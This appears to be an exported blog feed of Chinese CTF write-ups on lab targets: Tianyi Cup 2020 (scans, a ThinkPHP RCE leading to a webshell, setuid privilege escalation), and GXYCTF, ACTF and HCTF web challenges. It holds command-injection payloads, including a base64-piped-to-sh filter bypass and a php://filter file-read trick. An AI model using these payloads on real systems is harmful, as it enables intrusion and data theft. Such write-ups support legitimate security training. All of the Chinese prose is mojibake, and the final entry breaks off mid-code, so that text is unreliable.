        <content type="html"><![CDATA[<p>2020å¹´å¤©ç¿¼æ¯å†³èµ›wp by <strong><code>Jacobi_fly</code></strong></p><p><strong>Ps: é˜Ÿå‹æ‡’å¾—ä¸Šåšå®¢ï¼Œè®©æˆ‘æ¥åšï¼Œæ‰€ä»¥æœ‰å¹¸ç»™å‡ºæˆ‘ä»¬åšé¢˜çš„WP</strong></p><a id="more"></a><p><strong>0xDktbå¸ˆå‚…å¤ªå¼ºäº†</strong></p><p><strong>XZLangå¸ˆå‚…å¤ªå¼ºäº†</strong></p><p><strong>æˆ‘æ˜¯åºŸç‰©</strong></p><img src="å¤©ç¿¼æ¯2020/image-20200817214034533.png" alt="image-20200817214034533" style="zoom:50%;" /><p>ä¸‹é¢å·®ä¸å¤šæ˜¯æŒ‰ç…§è¿‡ç¨‹æ•´ç†å‡ºæ¥çš„WPï¼ˆå¤§æ¦‚ï¼‰ï¼Œæ¬¢è¿å„ä½å¸ˆå‚…äº¤æµï¼ˆåˆ«éª‚æˆ‘å‘œå‘œå‘œï¼‰</p><h3 id="Screenshot"><a href="#Screenshot" class="headerlink" title="Screenshot"></a>Screenshot</h3><p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/mWBlpZkSeqI2hof5.jpg!thumbnail.png" alt="img"></p><p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/ulFQZBQ7SbvCE8Bs.jpg!thumbnail.png" alt="img"></p><h3 id="flag23"><a href="#flag23" class="headerlink" title="flag23"></a>flag23</h3><p>APK è§£å‹ä¹‹åï¼Œä½¿ç”¨**<code>å­—ç¬¦ä¸²æœç´¢</code>**å¾—åˆ°flagï¼Œå’ŒåŸŸå<a href="http://ps.dasctf.wetolink.com/">http://ps.dasctf.wetolink.com</a> </p><p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/1qsdwRHrNAwAAAgw.png!thumbnail.png" alt="å›¾ç‰‡"></p><p>pingä¸€ä¸‹å¾—åˆ°ipåœ°å€ (ä¹Ÿå¯ä»¥ç›´æ¥nmapæ‰«è‡ªå·±çš„ip/24)</p><h3 id="Nmap-report"><a href="#Nmap-report" class="headerlink" title="Nmap report"></a>Nmap report</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.12.1 </span><br><span class="line">Host is up (0.10s latency). </span><br><span class="line">Not shown: 995 closed ports </span><br><span class="line">PORTÂ  Â  Â STATEÂ  Â  SERVICEÂ  Â  VERSION </span><br><span class="line">22/tcpÂ  Â openÂ  Â  Â sshÂ  Â  Â  Â  Huawei VRP sshd (protocol 1.99) </span><br><span class="line">23/tcpÂ  Â filtered telnet </span><br><span class="line">80/tcpÂ  Â openÂ  Â  Â httpÂ  Â  Â  Â Huawei S5700-series switch httpd </span><br><span class="line">443/tcpÂ  openÂ  Â  Â ssl/https? </span><br><span class="line">1045/tcp filtered fpitp </span><br><span class="line">Service Info: OS: VRP; Device: switch; CPE: cpe:/o:huawei:vrp </span><br><span class="line">Nmap scan report for 192.168.12.251 </span><br><span class="line">Host is up (0.15s latency). </span><br><span class="line">Not shown: 995 closed ports </span><br><span class="line">PORTÂ  Â  Â STATEÂ  Â  SERVICE VERSION </span><br><span class="line">22/tcpÂ  Â filtered ssh </span><br><span class="line">53/tcpÂ  Â openÂ  Â  Â domainÂ  dnsmasq 2.48 </span><br><span class="line">80/tcpÂ  Â openÂ  Â  Â httpÂ  Â  nginx </span><br><span class="line">3306/tcp filtered mysql </span><br><span class="line">8888/tcp openÂ  Â  Â httpÂ  Â  nginx </span><br><span class="line"> </span><br><span class="line">Nmap scan report for 192.168.12.252 </span><br><span class="line">Host is up (0.092s latency). </span><br><span class="line">Not shown: 995 closed ports </span><br><span class="line">PORTÂ  Â  Â STATEÂ  Â  SERVICE VERSION </span><br><span class="line">22/tcpÂ  Â filtered ssh </span><br><span class="line">53/tcpÂ  Â openÂ  Â  Â domainÂ  dnsmasq 2.48 </span><br><span class="line">80/tcpÂ  Â openÂ  Â  Â httpÂ  Â  nginx </span><br><span class="line">3306/tcp filtered mysql </span><br><span class="line">8888/tcp openÂ  Â  Â httpÂ  Â  nginx </span><br><span class="line">Nmap scan report for ps.dasctf.wetolink.com (192.168.12.253) </span><br><span class="line">Host is up (0.081s latency). </span><br><span class="line">Not shown: 995 closed ports </span><br><span class="line">PORTÂ  Â  Â STATEÂ  Â  SERVICE VERSION </span><br><span class="line">22/tcpÂ  Â filtered ssh </span><br><span class="line">53/tcpÂ  Â openÂ  Â  Â domainÂ  dnsmasq 2.48 </span><br><span class="line">80/tcpÂ  Â openÂ  Â  Â httpÂ  Â  nginx </span><br><span class="line">3306/tcp filtered mysql </span><br><span class="line">8888/tcp openÂ  Â  Â httpÂ  Â  nginx </span><br></pre></td></tr></table></figure><h3 id="flag17"><a href="#flag17" class="headerlink" title="flag17"></a>flag17</h3><p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/oASq6jCeYwtsQUIF.png!thumbnail.png" alt="å›¾ç‰‡"></p><h3 id="flag18"><a href="#flag18" class="headerlink" title="flag18"></a>flag18</h3><p>æŸ¥çœ‹<code>robots.txt</code> ï¼Œé‡Œé¢æœ‰ä¸€ä¸ªé“¾æ¥ï¼Œè¿›å…¥ä¹‹åçœ‹åˆ°æ˜¯</p><p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/3EwJGFPP1VmIO2lu.png!thumbnail.png" alt="å›¾ç‰‡"></p><p>å¾—åˆ°flag18 </p><h3 id="flag9"><a href="#flag9" class="headerlink" title="flag9"></a>flag9</h3><p>80ç«¯å£ç™»å½•å¤±è´¥ç»™flag9 </p><p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/maRrU72gyrotFALt.png!thumbnail.png" alt="å›¾ç‰‡"></p><h3 id="flag7"><a href="#flag7" class="headerlink" title="flag7"></a>flag7</h3><p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/hKzubHKKLzdN8jYu.png!thumbnail.png" alt="å›¾ç‰‡"></p><p><code>robots.txt</code> æ–‡ä»¶ç›´æ¥ç»™flag7 </p><h3 id="192-168-12-253-8888ç›®å½•æ‰«æç»“æœ"><a href="#192-168-12-253-8888ç›®å½•æ‰«æç»“æœ" class="headerlink" title="192.168.12.253:8888ç›®å½•æ‰«æç»“æœ"></a>192.168.12.253:8888ç›®å½•æ‰«æç»“æœ</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">[10:48:31] Starting: </span><br><span class="line">[10:48:35] 200 -Â  Â  6KB - /.DS_Store </span><br><span class="line">[10:49:12] 200 -Â  Â  5KB - /admin/login </span><br><span class="line">[10:49:12] 200 -Â  Â  5KB - /admin/login.html </span><br><span class="line">[10:49:12] 200 -Â  Â  5KB - /Admin/login / </span><br><span class="line">[10:50:02] 200 -Â  Â  0BÂ  - /backup/ </span><br><span class="line">[10:50:19] 200 -Â  Â  2KB - /article/admin </span><br><span class="line">[10:50:19] 200 -Â  Â  2KB - /article/admin/admin.asp </span><br><span class="line">[10:51:05] 200 -Â  Â 18KB - /Index </span><br><span class="line">[10:51:05] 200 -Â  Â 18KB - /index </span><br><span class="line">[10:51:06] 200 -Â  Â 18KB - /index.html </span><br><span class="line">[10:51:06] 200 -Â  Â 18KB - /index.php </span><br><span class="line">[10:51:06] 200 -Â  Â  7KB - /index.php/login/ </span><br><span class="line">[10:51:24] 200 -Â  Â  7KB - /login </span><br><span class="line">[10:51:24] 200 -Â  Â  7KB - /Login </span><br><span class="line">[10:51:25] 200 -Â  Â  7KB - /login.html </span><br><span class="line">[10:51:25] 200 -Â  Â  7KB - /Login.html </span><br><span class="line">[10:51:26] 200 -Â  Â  7KB - /login/ </span><br><span class="line">[10:51:26] 200 -Â  Â  7KB - /login/admin/ </span><br><span class="line">[10:51:27] 200 -Â  Â  7KB - /login/admin/admin.asp </span><br><span class="line">[10:51:27] 200 -Â  Â  7KB - /login/administrator/ </span><br><span class="line">[10:51:27] 200 -Â  Â  7KB - /login/cpanel.%2A </span><br><span class="line">[10:51:27] 200 -Â  Â  7KB - /login/cpanel/ </span><br><span class="line">[10:51:45] 200 -Â  Â  7KB - /login/index </span><br><span class="line">[10:51:45] 200 -Â  Â  7KB - /login/login </span><br><span class="line">[10:51:45] 200 -Â  Â  7KB - /login/oauth/ </span><br><span class="line">[10:51:46] 200 -Â  Â  7KB - /login/super </span><br><span class="line">[10:52:07] 200 -Â  Â  3KB - /README.md </span><br><span class="line">[10:52:09] 200 -Â  130BÂ  - /robots.txt </span><br><span class="line">[10:52:31] 200 -Â  Â 24KB - /register </span><br><span class="line">[10:52:41] 200 -Â  Â  0BÂ  - /vendor/autoload.php </span><br><span class="line">[10:52:41] 200 -Â  Â  0BÂ  - /vendor/composer/autoload_files.php </span><br><span class="line">[10:52:41] 200 -Â  Â  0BÂ  - /vendor/composer/autoload_classmap.php </span><br><span class="line">[10:52:41] 200 -Â  Â  0BÂ  - /vendor/composer/autoload_namespaces.php </span><br><span class="line">[10:52:41] 200 -Â  Â  0BÂ  - /vendor/composer/autoload_psr4.php </span><br><span class="line">[10:52:41] 200 -Â  Â  0BÂ  - /vendor/composer/autoload_real.php </span><br><span class="line">[10:52:41] 200 -Â  Â  0BÂ  - /vendor/composer/autoload_static.php </span><br><span class="line">[10:52:41] 200 -Â  Â  0BÂ  - /vendor/composer/ClassLoader.php </span><br><span class="line">[10:52:41] 200 -Â  Â 23KB - /vendor/composer/installed.json </span><br><span class="line">[10:52:41] 200 -Â  Â  1KB - /vendor/composer/LICENSE </span><br></pre></td></tr></table></figure><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p>æ˜¯ä¸€ä¸ª<code>thinkphp</code>ï¼Œç»è¿‡æµ‹è¯•å¾—åˆ°ç‰ˆæœ¬æ˜¯<code>5.0.14</code>ä½¿ç”¨kaliçš„<code>seachsploit</code>ï¼Œæ‰¾åˆ°ä¸€ä¸ªpayload </p><p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/S7N4aR0VTvVh7rZp.png!thumbnail.png" alt="å›¾ç‰‡"></p><p>så‚æ•°æ˜¯ä¸€ä¸ªRCEï¼Œå†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œä½¿ç”¨èšå‰‘è¿æ¥ï¼Œå¾—åˆ°åé—¨ </p><h3 id="flag1-amp-amp-flag5"><a href="#flag1-amp-amp-flag5" class="headerlink" title="flag1 &amp;&amp; flag5"></a>flag1 &amp;&amp; flag5</h3><p>åœ¨<code>/home</code>ç›®å½•ä¸‹å‘ç°flag1å’Œflag5ï¼Œå…¶ä¸­flag1å¯ä»¥ç›´æ¥è¯» </p><p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/kf3ZiTKPfXAnEbIG.png!thumbnail.png" alt="å›¾ç‰‡"></p><p>flag5éœ€è¦rootæƒé™ï¼Œ </p><p>æ‰¾ä¸€ä¸‹<code>setuid</code>çš„ä¸œè¥¿ï¼Œæ‰¾åˆ°ä¸€ä¸ª<code>nl</code> </p><p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/XxkZNxARcAaQfu9Z.png!thumbnail.png" alt="å›¾ç‰‡"></p><h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>æŸ¥çœ‹<code>/var/www/html/application/database.php</code>ï¼Œæ•°æ®åº“é…ç½®çš„æ˜¯å†…ç½‘çš„ä¸€å°ä¸»æœºã€‚ </p><p>ç”¨å†°èè¿æ¥æŸ¥è¯¢flag: </p><p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/u9enAOu1xXM94wGP.png!thumbnail.png" alt="å›¾ç‰‡"></p><p>æˆ–è€…æŸ¥çœ‹<code>/proc/net/arp</code>ä¹Ÿå¯ä»¥å‘ç°å†…ç½‘çš„ä¸»æœºã€‚ </p><h3 id="flag19"><a href="#flag19" class="headerlink" title="flag19"></a>flag19</h3><p>åœ¨80ç«¯å£ä½¿ç”¨CBCå­—èŠ‚ç¿»è½¬æ”»å‡»çš„æ—¶å€™ï¼Œè§£ç <code>cookie</code>æ—¶å‘ç°ã€‚ </p><p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/stkRZawsSKCozytq.jpg!thumbnail.png" alt="å›¾ç‰‡"></p><h3 id="flag22"><a href="#flag22" class="headerlink" title="flag22"></a>flag22</h3><p>ç™»å½•å®Œä¹‹åï¼Œä¸Šä¼  <code>test.avi</code> ç„¶åä¸‹è½½ï¼Œä¹‹åæ‹¿åˆ° .avi æ’­æ”¾ï¼Œè·å¾— flagã€‚ </p><p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/ovsCwUxRD94gsU4e.jpg!thumbnail.png" alt="å›¾ç‰‡"></p><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>æ˜¯Jacobi_flyé˜Ÿä¼çš„å‡ºé“æˆ˜å½¹ï¼ˆä»¥å‰ä¸å«è¿™å</p><p>ä¹Ÿæ˜¯æˆ‘ä»¬ç›®å‰å–å¾—çš„æœ€å¥½çš„æˆç»©ï¼Œè¿™é‡Œç‰¹åˆ«æ„Ÿè°¢æˆ‘çš„é˜Ÿå‹ä»¬</p><ul><li><p>åˆèµ›ç”±æ·˜å®å¸ˆå‚…ä¸€äººcarryï¼Œå¸¦ç€ä¸€é“é¢˜æ²¡åšå‡ºæ¥çš„æˆ‘å’Œåšäº†ç­¾åˆ°é¢˜çš„XZLangè¿›å…¥å¤èµ›</p></li><li><p>è¿™æ¬¡æ·˜å®å¸ˆå‚…åˆcarryäº†ï¼Œå¤§å¤šæ•°flagéƒ½æ˜¯ç”±ä»–äº¤ä¸Šï¼Œä¸€äººç‹‚ç 1000+åˆ†ï¼ˆx</p></li><li><p>XZLangå¸ˆå‚…ä¹Ÿå¾ˆNB</p></li><li><p><font color='red'>åªæœ‰æˆ‘æ˜¯åºŸç‰©å‘œå‘œå‘œ</font></p></li></ul><p>â€‹    </p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> å¤©ç¿¼æ¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GXYCTF2019_Ping Ping Ping</title>
      <link href="/buu_GXYCTF2019_Ping_Ping_Ping.html"/>
      <url>/buu_GXYCTF2019_Ping_Ping_Ping.html</url>
      
        <content type="html"><![CDATA[<p><a href="%5Bhttps://buuoj.cn/challenges">buuoj</a></p><a id="more"></a><h2 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h2><img src="[GXYCTF2019]Ping Ping Ping/image-20200809214947203.png" alt="image-20200809214947203" style="zoom:50%;" /><p>ç»™äº†ä¸€ä¸ªå‚æ•°æ˜¯<code>ip</code>ï¼ŒçŒœæµ‹ä¹Ÿæ˜¯å‘½ä»¤æ‰§è¡Œ</p><p>ä½¿ç”¨<code>?ip=l;ls</code></p><img src="[GXYCTF2019]Ping Ping Ping/image-20200809215038502.png" alt="image-20200809215038502" style="zoom:50%;" /><p>å°è¯•<code>cat flag.php</code></p><img src="[GXYCTF2019]Ping Ping Ping/image-20200809215106353.png" alt="image-20200809215106353" style="zoom:50%;" /><p>è¿‡æ»¤äº†ç©ºæ ¼</p><h2 id="ç»•è¿‡ç©ºæ ¼"><a href="#ç»•è¿‡ç©ºæ ¼" class="headerlink" title="ç»•è¿‡ç©ºæ ¼"></a>ç»•è¿‡ç©ºæ ¼</h2><p>æŸ¥æ‰¾èµ„æ–™ç”¨äºç»•è¿‡ç©ºæ ¼</p><p><a href="https://www.freebuf.com/articles/web/137923.html">CTFä¸­ç»•è¿‡å°æŠ€å·§</a></p><p>ç»è¿‡æµ‹è¯•å‘ç°<code>$IFS$9</code>å¯ä»¥ç»•è¿‡</p><img src="[GXYCTF2019]Ping Ping Ping/image-20200809215218599.png" alt="image-20200809215218599" style="zoom:50%;" /><p>ç»§ç»­è¯»<code>flag.php</code></p><img src="[GXYCTF2019]Ping Ping Ping/image-20200809215246648.png" alt="image-20200809215246648" style="zoom:50%;" /><p><code>flag</code>ä¹Ÿè¢«è¿‡æ»¤äº†</p><p>çœ‹ä¸€ä¸‹<code>index.php</code>çš„ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    ....</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ /&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your space!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/bash/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your bash!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your flag!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$a</span> = shell_exec(<span class="string">&quot;ping -c 4 &quot;</span>.<span class="variable">$ip</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">  print_r(<span class="variable">$a</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="ç»•è¿‡flag"><a href="#ç»•è¿‡flag" class="headerlink" title="ç»•è¿‡flag"></a>ç»•è¿‡flag</h2><p>è¿™é‡Œå±è”½äº†å¾ˆå¤šè¯­æ³•ï¼Œä½†æ˜¯æ²¡æœ‰å±è”½<code>base64</code>å’Œ<code>sh</code></p><p>ä½¿ç”¨<code>base64 -d</code>å¯ä»¥è¾¾åˆ°ç›¸åŒçš„ä½œç”¨</p><p><code>payload</code>å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;l;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œä¹‹ååœ¨æ³¨é‡Šé‡Œé¢çœ‹åˆ°<code>flag</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?ip&#x3D;</span><br><span class="line">&lt;pre&gt;PING l (127.0.0.1): 56 data bytes</span><br><span class="line">&lt;?php</span><br><span class="line">$flag &#x3D; &quot;flag&#123;3158ae61-1e44-495d-9f83-f63a7c25fd14&#125;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
          <category> buu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ACTF2020</title>
      <link href="/buu_ACTF2020.html"/>
      <url>/buu_ACTF2020.html</url>
      
        <content type="html"><![CDATA[<p><a href="%5Bhttps://buuoj.cn/challenges">buuoj</a></p><a id="more"></a><h1 id="ACTF-2020-Exec"><a href="#ACTF-2020-Exec" class="headerlink" title="ACTF-2020-Exec"></a>ACTF-2020-Exec</h1><p>ç‚¹è¿›é¶æœºç•Œé¢å¦‚ä¸‹</p><img src="[ACTF2020 æ–°ç”Ÿèµ›]Exec/image-20200809213540334.png" alt="image-20200809213540334" style="zoom:50%;" /><p>ç»“åˆé¢˜ç›®åï¼ŒçŒœæµ‹æ˜¯å‘½ä»¤æ‰§è¡Œ</p><p>è¾“å…¥<code>l | ls</code></p><img src="[ACTF2020 æ–°ç”Ÿèµ›]Exec/image-20200809213614575.png" alt="image-20200809213614575" style="zoom:50%;" /><p>ç¡®å®æ˜¯è¿™æ ·ï¼Œä¸€æ­¥ä¸€æ­¥æŸ¥æ‰¾ï¼Œåœ¨æ ¹ç›®å½•ä¸‹æ‰¾åˆ°äº†<code>flag</code></p><img src="[ACTF2020 æ–°ç”Ÿèµ›]Exec/image-20200809213701427.png" alt="image-20200809213701427" style="zoom:50%;" /><p>ä½¿ç”¨<code>cat</code>å‘½ä»¤è¯»å–</p><img src="[ACTF2020 æ–°ç”Ÿèµ›]Exec/image-20200809213717018.png" alt="image-20200809213717018" style="zoom:50%;" /><h1 id="ACTF-2020-Include"><a href="#ACTF-2020-Include" class="headerlink" title="ACTF-2020-Include"></a>ACTF-2020-Include</h1><h2 id="Index-php"><a href="#Index-php" class="headerlink" title="Index.php"></a>Index.php</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta charset&#x3D;&quot;utf8&quot;&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;?file&#x3D;flag.php&quot;&gt;tips&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure><p>ç»“åˆé¢˜ç›®åå¯ä»¥çŒœæµ‹æ˜¯ä¸€ä¸ªæ–‡ä»¶åŒ…å«</p><p>ä½¿ç”¨<code>phpä¼ªåè®®</code>è¯»ä¸€ä¸‹æºç </p><p><code>?file=php://filter/read=convert.base64-encode/resource=index.php</code></p><p>è§£ç ä¹‹åæ˜¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta charset&#x3D;&quot;utf8&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$file &#x3D; $_GET[&quot;file&quot;];</span><br><span class="line">if(stristr($file,&quot;php:&#x2F;&#x2F;input&quot;) || stristr($file,&quot;zip:&#x2F;&#x2F;&quot;) || stristr($file,&quot;phar:&#x2F;&#x2F;&quot;) || stristr($file,&quot;data:&quot;))&#123;</span><br><span class="line">exit(&#39;hacker!&#39;);</span><br><span class="line">&#125;</span><br><span class="line">if($file)&#123;</span><br><span class="line">include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo &#39;&lt;a href&#x3D;&quot;?file&#x3D;flag.php&quot;&gt;tips&lt;&#x2F;a&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a>flag.php</h2><p>é€šè¿‡è¿™ä¸ªæ–‡ä»¶åŒ…å«è¯»ä¸€ä¸‹<code>flag.php</code>çš„æºç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;Can you find out the flag?&quot;;</span><br><span class="line">&#x2F;&#x2F;flag&#123;bfb0b1cd-426b-4590-9b3d-059c3b3cec96&#125;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°äº†flag</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
          <category> buu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HCTF_2018_WarmUp</title>
      <link href="/buu_HCTF2018_WarmUp.html"/>
      <url>/buu_HCTF2018_WarmUp.html</url>
      
        <content type="html"><![CDATA[<p><a href="%5Bhttps://buuoj.cn/challenges">buuoj</a></p><a id="more"></a><h2 id="Index-php"><a href="#Index-php" class="headerlink" title="Index.php"></a>Index.php</h2><p>è®¿é—®ä¹‹åæ˜¯ä¸€ä¸ªæ»‘ç¨½çš„è¡¨æƒ…ï¼ŒæŸ¥çœ‹ç½‘é¡µæºä»£ç æç¤ºæœ‰ä¸€ä¸ª<code>source.php</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1.0&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;ie&#x3D;edge&quot;&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;!--source.php--&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;br&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;11&#x2F;01&#x2F;5bdb0d93dc794.jpg&quot; &#x2F;&gt;&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><h2 id="source-php"><a href="#source-php" class="headerlink" title="source.php"></a>source.php</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    class emmm</span><br><span class="line">    &#123;</span><br><span class="line">        public static function checkFile(&amp;$page)</span><br><span class="line">        &#123;</span><br><span class="line">            $whitelist &#x3D; [&quot;source&quot;&#x3D;&gt;&quot;source.php&quot;,&quot;hint&quot;&#x3D;&gt;&quot;hint.php&quot;];</span><br><span class="line">            if (! isset($page) || !is_string($page)) &#123;</span><br><span class="line">    